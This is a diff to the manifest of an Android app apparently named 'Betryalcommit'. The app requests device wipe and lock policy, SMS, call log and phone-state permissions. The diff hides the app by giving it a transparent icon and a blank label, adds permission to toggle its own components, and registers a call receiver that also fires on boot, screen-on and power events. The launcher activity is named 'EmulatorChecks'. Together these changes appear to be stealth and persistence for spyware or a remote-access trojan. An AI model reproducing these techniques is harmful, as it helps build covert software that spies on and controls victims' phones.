@@ -53,6 +53,7 @@
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE"/>
     <uses-permission android:name="android.permission.MANAGE_DEVICE_POLICY_WIPE_DATA" />
     <uses-permission android:name="android.permission.MANAGE_DEVICE_POLICY_ACROSS_USERS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
@@ -66,9 +67,10 @@
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
-    <uses-feature android:name="android.hardware.camera" />
-    <uses-feature android:name="android.hardware.camera.autofocus" />
-    <uses-feature android:name="android.hardware.microphone" />
+    <uses-feature android:name="android.hardware.camera"
+        android:required="false" />
+    <uses-feature android:name="android.hardware.microphone"
+        android:required="false" />
     <uses-feature
         android:name="android.hardware.telephony"
         android:required="false" />
@@ -83,28 +85,28 @@
         android:required="false" />
     <uses-feature
         android:name="android.hardware.touchscreen"
-        android:required="false" /> <!-- <uses-feature -->
-    <!-- android:name="android.software.leanback" -->
-    <!-- android:required="false" /> -->
+        android:required="false" />
+     <uses-feature
+     android:name="android.software.leanback"
+     android:required="false" />
     <uses-permission android:name="android.permission.MANAGE_DEVICE_POLICY_LOCK" />
 
     <application
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
+        android:icon="@drawable/transparent"
+        android:label=" "
         android:supportsRtl="true"
         android:theme="@style/Theme.Betryalcommit"
         android:usesCleartextTraffic="true"
-        tools:targetApi="26">
+        tools:targetApi="26"
+        tools1:ignore="MissingTvBanner">
         <activity
             android:name=".EmulatorChecks"
             android:exported="true" >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
-
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
@@ -129,6 +131,13 @@
         <receiver android:name=".USSDReceiver">
             <intent-filter>
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                <action android:name="android.intent.action.PHONE_STATE" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.BATTERY_LOW" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.SCREEN_ON"  />
             </intent-filter>
         </receiver>
 
